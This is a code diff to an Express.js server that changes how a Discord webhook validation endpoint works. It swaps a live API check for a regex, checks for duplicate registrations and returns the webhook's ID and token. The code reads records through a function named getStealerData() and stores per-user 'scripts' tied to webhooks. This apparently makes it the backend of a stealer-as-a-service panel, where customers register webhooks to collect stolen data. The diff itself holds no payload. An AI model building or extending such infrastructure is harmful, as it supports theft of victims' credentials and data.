@@ -654,43 +654,40 @@ app.post('/api/webhook/validate/*', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
     }
 
-    // If webhook doesn't start with https://, add it
-    if (!webhook.startsWith('http://') && !webhook.startsWith('https://')) {
-      webhook = 'https://' + webhook;
+    // Validate webhook format locally without API call
+    // Discord webhook format: https://discord.com/api/webhooks/{ID}/{TOKEN} or https://ptb.discord.com/api/webhooks/{ID}/{TOKEN}
+    const webhookRegex = /^https:\/\/(ptb\.)?discord\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)$/;
+    
+    if (!webhookRegex.test(webhook)) {
+      return res.status(400).json({ success: false, message: 'Invalid Discord webhook format' });
     }
 
-    console.log('Validating webhook:', webhook);
-
-    try {
-      // Discord API ile webhook'u doğrula
-      const response = await axios.get(webhook, { 
-        timeout: 10000,
-        headers: {
-          'User-Agent': 'Mozilla/5.0'
-        }
-      });
+    // Check if webhook is already registered
+    if (req.session.user) {
+      const data = await getStealerData();
+      const scripts = data.scripts || [];
+      const existingScript = scripts.find(s => s.userId === req.session.user.id && s.webhook === webhook);
       
-      console.log('Discord response:', response.data);
-
-      // Discord webhook response'u check et
-      if (!response.data || !response.data.id) {
-        return res.status(400).json({ success: false, message: 'Invalid Discord webhook format' });
+      if (existingScript) {
+        return res.status(400).json({ success: false, message: 'This webhook has already been registered' });
       }
-
-      res.json({ 
-        success: true, 
-        message: 'Webhook is valid',
-        data: response.data
-      });
-    } catch (error) {
-      console.error('Webhook validation error:', error.message, error.response?.status);
-      if (error.response?.status === 404) {
-        return res.status(400).json({ success: false, message: 'Webhook not found or invalid' });
-      }
-      res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
     }
+
+    // Extract ID and token for response
+    const match = webhook.match(webhookRegex);
+    const webhookId = match[2];
+    const webhookToken = match[3];
+
+    res.json({ 
+      success: true, 
+      message: 'Webhook is valid',
+      data: {
+        id: webhookId,
+        token: webhookToken,
+        url: webhook
+      }
+    });
   } catch (error) {
-    console.error('Server error:', error);
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
@@ -1209,7 +1206,7 @@ app.post('/api/captcha/verify', (req, res) => {
 
 // ============= ERROR HANDLING =============
 app.use((err, req, res, next) => {
-  console.error('Server error:', err);
+  console.error('Server error:',   err);
   res.status(500).json({ 
     success: false, 
     message: 'Internal server error',
